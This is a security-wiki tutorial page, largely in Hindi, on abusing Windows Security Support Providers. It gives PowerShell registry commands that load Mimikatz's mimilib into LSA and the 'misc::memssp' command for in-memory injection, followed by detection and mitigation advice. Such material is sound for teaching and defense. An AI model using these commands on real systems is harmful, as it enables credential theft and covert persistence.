# Custom Security Support Providers

{{#include ../../banners/hacktricks-training.md}}

[Security Support Providers (SSPs)](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi) LSA द्वारा load किए जाने वाले DLL-आधारित security packages हैं। Windows custom SSP/AP DLLs को `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` `REG_MULTI_SZ` value के माध्यम से register करता है और system शुरू होने पर registered packages को load करता है।<sup>[[1]](#references)</sup>

क्योंकि SSPs LSA में run होते हैं और credentials प्राप्त कर सकते हैं, adversaries credential access और persistence के लिए malicious package का दुरुपयोग कर सकते हैं। MITRE इस behavior को T1547.005 के रूप में track करता है।<sup>[[2]](#references)</sup>

## Mimikatz `mimilib`

Mimikatz में `mimilib.dll` शामिल है, जो ऐसा SSP implement करता है जो load होने के बाद handle किए गए credentials को record करता है। अधिकृत lab में, target architecture से match करने वाली DLL को `C:\Windows\System32` में रखें, फिर इसे बदलने से पहले current package list inspect करें।<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$packages = (Get-ItemProperty -Path $lsaPath -Name 'Security Packages').'Security Packages'
$packages
```
एक सामान्य मौजूदा value में `kerberos`, `msv1_0`, `schannel`, `wdigest`, `tspkg` और `pku2u` जैसे packages हो सकते हैं। custom package जोड़ते समय प्रत्येक मौजूदा entry को सुरक्षित रखें।<sup>[[1]](#references)</sup>

मौजूदा packages को replace किए बिना `mimilib` जोड़ें:
```powershell
if ($packages -notcontains 'mimilib') {
Set-ItemProperty -Path $lsaPath -Name 'Security Packages' -Value ($packages + 'mimilib')
}
```
Reboot के बाद, package को LSA में load किया जाता है और इसके बाद captured credentials को इस implementation द्वारा `C:\Windows\System32\kiwissp.log` में लिखा जाता है।<sup>[[2]](#references)[[3]](#references)</sup>

## In-memory Loading

Mimikatz अपनी SSP implementation को current LSASS process में inject भी कर सकता है:<sup>[[3]](#references)</sup>
```text
privilege::debug
misc::memssp
```
यह method reboot के बाद persist नहीं करता।<sup>[[2]](#references)[[3]](#references)</sup>

## Detection and Mitigation

`...\Lsa\Security Packages` में changes और `lsass.exe` में unexpected DLL loads को monitor करें। Security event 4657 registry **value** modification को केवल तब record करता है, जब संबंधित Audit Registry policy और SACL configured हों।<sup>[[2]](#references)[[4]](#references)</sup>

जहाँ compatible हो, अतिरिक्त LSA protection enable करें और unsigned या unexpected SSP DLLs की जाँच करें। Microsoft LSA protection को विशेष रूप से ऐसे code injection के विरुद्ध control के रूप में document करता है, जो credentials को compromise कर सकता है।<sup>[[5]](#references)</sup>

## References

- [1] [Microsoft Learn - SSP/AP DLLs को register करना](https://learn.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls)
- [2] [MITRE ATT&CK T1547.005 - Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
- [3] [Mimikatz repository - `mimilib`](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
- [4] [Microsoft Learn - Security event 4657](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
- [5] [Microsoft Learn - अतिरिक्त LSA protection configure करना](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
